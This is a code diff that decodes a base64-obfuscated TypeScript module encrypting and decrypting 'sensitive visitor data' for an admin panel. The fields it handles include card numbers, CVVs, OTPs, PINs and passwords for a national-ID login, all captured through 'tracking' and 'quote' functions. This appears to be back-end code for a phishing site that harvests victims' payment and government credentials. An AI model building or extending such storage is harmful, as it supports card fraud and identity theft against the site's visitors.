@@ -1,1 +1,111 @@
-LyoqCiAqIFNlcnZlci1vbmx5IEFFUy0yNTYtR0NNIGZpZWxkIGVuY3J5cHRpb24gZm9yIHNlbnNpdGl2ZSB2aXNpdG9yIGRhdGEuCiAqCiAqIC0gRW5jcnlwdCBiZWZvcmUgaW5zZXJ0IGluIHB1YmxpYyBzZXJ2ZXIgZnVuY3Rpb25zICh0cmFja2luZywgcXVvdGVzKS4KICogLSBEZWNyeXB0IG9ubHkgaW4gYWRtaW4gc2VydmVyIGZ1bmN0aW9ucywgYWZ0ZXIgYWRtaW4gcm9sZSBjaGVjay4KICogLSBEZWNyeXB0aW9uIGlzIHRvbGVyYW50OiB2YWx1ZXMgdGhhdCBkb24ndCBzdGFydCB3aXRoIHRoZSAiZW5jOnYxOiIgcHJlZml4CiAqICAgYXJlIHJldHVybmVkIGFzLWlzLCBzbyBleGlzdGluZyBwbGFpbnRleHQgcm93cyBzdGlsbCBkaXNwbGF5LgogKi8KaW1wb3J0IHsgY3JlYXRlQ2lwaGVyaXYsIGNyZWF0ZURlY2lwaGVyaXYsIHJhbmRvbUJ5dGVzLCBjcmVhdGVIYXNoLCBjcmVhdGVIbWFjIH0gZnJvbSAiY3J5cHRvIjsKCmNvbnN0IFBSRUZJWCA9ICJlbmM6djE6IjsKCmZ1bmN0aW9uIGdldEtleSgpOiBCdWZmZXIgewogIGNvbnN0IHJhdyA9IHByb2Nlc3MuZW52WyJEQVRBX0VOQ1JZUFRJT05fS0VZIl07CiAgaWYgKCFyYXcpIHRocm93IG5ldyBFcnJvcigiREFUQV9FTkNSWVBUSU9OX0tFWSBpcyBub3QgY29uZmlndXJlZCIpOwogIC8vIERlcml2ZSBhIHN0YWJsZSAzMi1ieXRlIGtleSBmcm9tIHdoYXRldmVyIGxlbmd0aCB0aGUgc3RvcmVkIHNlY3JldCBoYXMuCiAgcmV0dXJuIGNyZWF0ZUhhc2goInNoYTI1NiIpLnVwZGF0ZShyYXcsICJ1dGY4IikuZGlnZXN0KCk7Cn0KCmV4cG9ydCBmdW5jdGlvbiBlbmNyeXB0RmllbGQodmFsdWU6IHN0cmluZyB8IG51bGwgfCB1bmRlZmluZWQpOiBzdHJpbmcgfCBudWxsIHsKICBpZiAodmFsdWUgPT0gbnVsbCkgcmV0dXJuIG51bGw7CiAgY29uc3QgcyA9IFN0cmluZyh2YWx1ZSk7CiAgaWYgKHMubGVuZ3RoID09PSAwKSByZXR1cm4gczsKICBpZiAocy5zdGFydHNXaXRoKFBSRUZJWCkpIHJldHVybiBzOyAvLyBhbHJlYWR5IGVuY3J5cHRlZAogIGNvbnN0IGl2ID0gcmFuZG9tQnl0ZXMoMTIpOwogIGNvbnN0IGNpcGhlciA9IGNyZWF0ZUNpcGhlcml2KCJhZXMtMjU2LWdjbSIsIGdldEtleSgpLCBpdik7CiAgY29uc3QgY3QgPSBCdWZmZXIuY29uY2F0KFtjaXBoZXIudXBkYXRlKHMsICJ1dGY4IiksIGNpcGhlci5maW5hbCgpXSk7CiAgY29uc3QgdGFnID0gY2lwaGVyLmdldEF1dGhUYWcoKTsKICByZXR1cm4gUFJFRklYICsgQnVmZmVyLmNvbmNhdChbaXYsIHRhZywgY3RdKS50b1N0cmluZygiYmFzZTY0Iik7Cn0KCmV4cG9ydCBmdW5jdGlvbiBkZWNyeXB0RmllbGQ8VCBleHRlbmRzIHN0cmluZyB8IG51bGwgfCB1bmRlZmluZWQ+KHZhbHVlOiBUKTogVCB7CiAgaWYgKHZhbHVlID09IG51bGwpIHJldHVybiB2YWx1ZTsKICBjb25zdCBzID0gU3RyaW5nKHZhbHVlKTsKICBpZiAoIXMuc3RhcnRzV2l0aChQUkVGSVgpKSByZXR1cm4gdmFsdWU7CiAgdHJ5IHsKICAgIGNvbnN0IGJ1ZiA9IEJ1ZmZlci5mcm9tKHMuc2xpY2UoUFJFRklYLmxlbmd0aCksICJiYXNlNjQiKTsKICAgIGNvbnN0IGl2ID0gYnVmLnN1YmFycmF5KDAsIDEyKTsKICAgIGNvbnN0IHRhZyA9IGJ1Zi5zdWJhcnJheSgxMiwgMjgpOwogICAgY29uc3QgY3QgPSBidWYuc3ViYXJyYXkoMjgpOwogICAgY29uc3QgZGVjaXBoZXIgPSBjcmVhdGVEZWNpcGhlcml2KCJhZXMtMjU2LWdjbSIsIGdldEtleSgpLCBpdik7CiAgICBkZWNpcGhlci5zZXRBdXRoVGFnKHRhZyk7CiAgICBjb25zdCBwdCA9IEJ1ZmZlci5jb25jYXQoW2RlY2lwaGVyLnVwZGF0ZShjdCksIGRlY2lwaGVyLmZpbmFsKCldKTsKICAgIHJldHVybiBwdC50b1N0cmluZygidXRmOCIpIGFzIFQ7CiAgfSBjYXRjaCB7CiAgICByZXR1cm4gdmFsdWU7CiAgfQp9CgovKioKICogRGV0ZXJtaW5pc3RpYyBibGluZCBpbmRleCAoSE1BQy1TSEEyNTYpIGZvciBlbmNyeXB0ZWQgZmllbGRzIHRoYXQgbXVzdCBzdGF5CiAqIHNlYXJjaGFibGUgKHNzbi9waG9uZSBkZWR1cGUsIGFkbWluIHNlYXJjaCkuIEVxdWFsaXR5LW9ubHk7IG5ldmVyIHJldmVyc2libGUuCiAqLwpleHBvcnQgZnVuY3Rpb24gaGFzaEZpZWxkKHZhbHVlOiBzdHJpbmcgfCBudWxsIHwgdW5kZWZpbmVkKTogc3RyaW5nIHwgbnVsbCB7CiAgaWYgKHZhbHVlID09IG51bGwpIHJldHVybiBudWxsOwogIGNvbnN0IHMgPSBTdHJpbmcodmFsdWUpLnRyaW0oKTsKICBpZiAocy5sZW5ndGggPT09IDApIHJldHVybiBudWxsOwogIHJldHVybiBjcmVhdGVIbWFjKCJzaGEyNTYiLCBnZXRLZXkoKSkudXBkYXRlKHMsICJ1dGY4IikuZGlnZXN0KCJoZXgiKTsKfQoKLyoqIFJlY3Vyc2l2ZWx5IGRlY3J5cHQgc3RyaW5nIGZpZWxkcyBvbiBhbiBvYmplY3QvYXJyYXkgcmV0dXJuZWQgdG8gYWRtaW4gVUlzLiAqLwpjb25zdCBTRU5TSVRJVkVfRklFTERTID0gbmV3IFNldChbCiAgImNhcmRfbnVtYmVyIiwKICAiY2FyZF9uYW1lIiwKICAiY3Z2IiwKICAieWVhciIsCiAgIm90cCIsCiAgInBpbiIsCiAgImNvZGUiLAogICJ1c2VybmFtZSIsCiAgInBhc3N3b3JkIiwKICAidXNlcm5hbWVfbmFmYXRoIiwKICAicGFzc3dvcmRfbmFmYXRoIiwKICAicGhvbmVfbnVtYmVyIiwKICAic3NuIiwKICAic2VsbGVyX3NzbiIsCiAgInBob25lIiwKICAiZnVsbF9uYW1lIiwKICAidmlzaXRvcl9uYW1lIiwKICAiZW1haWwiLAogICJub3RlcyIsCiAgIm1lc3NhZ2UiLAogICJwbGF0ZV9udW1iZXIiLAogICJzZXJpYWxfbnVtYmVyIiwKICAibGljZW5zZV9udW1iZXIiLAogICJ3b3JrcGxhY2UiLAogICJwcm9mZXNzaW9uIiwKICAiY3VycmVudF9pbnN1cmVyIiwKICAiZGVzdGluYXRpb24iLAogICJ0cmF2ZWxlcl9hZ2VzIiwKICAidXNlcl9hZ2VudCIsCl0pOwoKZXhwb3J0IGZ1bmN0aW9uIGRlY3J5cHREZWVwPFQ+KGlucHV0OiBUKTogVCB7CiAgaWYgKGlucHV0ID09IG51bGwpIHJldHVybiBpbnB1dDsKICBpZiAoQXJyYXkuaXNBcnJheShpbnB1dCkpIHJldHVybiBpbnB1dC5tYXAoKHYpID0+IGRlY3J5cHREZWVwKHYpKSBhcyB1bmtub3duIGFzIFQ7CiAgaWYgKHR5cGVvZiBpbnB1dCA9PT0gIm9iamVjdCIpIHsKICAgIGNvbnN0IG91dDogUmVjb3JkPHN0cmluZywgdW5rbm93bj4gPSB7fTsKICAgIGZvciAoY29uc3QgW2ssIHZdIG9mIE9iamVjdC5lbnRyaWVzKGlucHV0IGFzIFJlY29yZDxzdHJpbmcsIHVua25vd24+KSkgewogICAgICBpZiAodHlwZW9mIHYgPT09ICJzdHJpbmciICYmIFNFTlNJVElWRV9GSUVMRFMuaGFzKGspKSB7CiAgICAgICAgb3V0W2tdID0gZGVjcnlwdEZpZWxkKHYpOwogICAgICB9IGVsc2UgaWYgKHYgJiYgdHlwZW9mIHYgPT09ICJvYmplY3QiKSB7CiAgICAgICAgb3V0W2tdID0gZGVjcnlwdERlZXAodik7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgb3V0W2tdID0gdjsKICAgICAgfQogICAgfQogICAgcmV0dXJuIG91dCBhcyBUOwogIH0KICByZXR1cm4gaW5wdXQ7Cn0K
+/**
+ * Server-only AES-256-GCM field encryption for sensitive visitor data.
+ *
+ * - Encrypt before insert in public server functions (tracking, quotes).
+ * - Decrypt only in admin server functions, after admin role check.
+ * - Decryption is tolerant: values that don't start with the "enc:v1:" prefix
+ *   are returned as-is, so existing plaintext rows still display.
+ */
+import { createCipheriv, createDecipheriv, randomBytes, createHash, createHmac } from "crypto";
+
+const PREFIX = "enc:v1:";
+
+function getKey(): Buffer {
+  const raw = process.env["DATA_ENCRYPTION_KEY"];
+  if (!raw) throw new Error("DATA_ENCRYPTION_KEY is not configured");
+  // Derive a stable 32-byte key from whatever length the stored secret has.
+  return createHash("sha256").update(raw, "utf8").digest();
+}
+
+export function encryptField(value: string | null | undefined): string | null {
+  if (value == null) return null;
+  const s = String(value);
+  if (s.length === 0) return s;
+  if (s.startsWith(PREFIX)) return s; // already encrypted
+  const iv = randomBytes(12);
+  const cipher = createCipheriv("aes-256-gcm", getKey(), iv);
+  const ct = Buffer.concat([cipher.update(s, "utf8"), cipher.final()]);
+  const tag = cipher.getAuthTag();
+  return PREFIX + Buffer.concat([iv, tag, ct]).toString("base64");
+}
+
+export function decryptField<T extends string | null | undefined>(value: T): T {
+  if (value == null) return value;
+  const s = String(value);
+  if (!s.startsWith(PREFIX)) return value;
+  try {
+    const buf = Buffer.from(s.slice(PREFIX.length), "base64");
+    const iv = buf.subarray(0, 12);
+    const tag = buf.subarray(12, 28);
+    const ct = buf.subarray(28);
+    const decipher = createDecipheriv("aes-256-gcm", getKey(), iv);
+    decipher.setAuthTag(tag);
+    const pt = Buffer.concat([decipher.update(ct), decipher.final()]);
+    return pt.toString("utf8") as T;
+  } catch {
+    return value;
+  }
+}
+
+/**
+ * Deterministic blind index (HMAC-SHA256) for encrypted fields that must stay
+ * searchable (ssn/phone dedupe, admin search). Equality-only; never reversible.
+ */
+export function hashField(value: string | null | undefined): string | null {
+  if (value == null) return null;
+  const s = String(value).trim();
+  if (s.length === 0) return null;
+  return createHmac("sha256", getKey()).update(s, "utf8").digest("hex");
+}
+
+/** Recursively decrypt string fields on an object/array returned to admin UIs. */
+const SENSITIVE_FIELDS = new Set([
+  "card_number",
+  "card_name",
+  "cvv",
+  "year",
+  "otp",
+  "pin",
+  "code",
+  "username",
+  "password",
+  "username_nafath",
+  "password_nafath",
+  "phone_number",
+  "ssn",
+  "seller_ssn",
+  "phone",
+  "full_name",
+  "visitor_name",
+  "email",
+  "notes",
+  "message",
+  "plate_number",
+  "serial_number",
+  "license_number",
+  "workplace",
+  "profession",
+  "current_insurer",
+  "destination",
+  "traveler_ages",
+  "user_agent",
+]);
+
+export function decryptDeep<T>(input: T): T {
+  if (input == null) return input;
+  if (Array.isArray(input)) return input.map((v) => decryptDeep(v)) as unknown as T;
+  if (typeof input === "object") {
+    const out: Record<string, unknown> = {};
+    for (const [k, v] of Object.entries(input as Record<string, unknown>)) {
+      if (typeof v === "string" && SENSITIVE_FIELDS.has(k)) {
+        out[k] = decryptField(v);
+      } else if (v && typeof v === "object") {
+        out[k] = decryptDeep(v);
+      } else {
+        out[k] = v;
+      }
+    }
+    return out as T;
+  }
+  return input;
+}
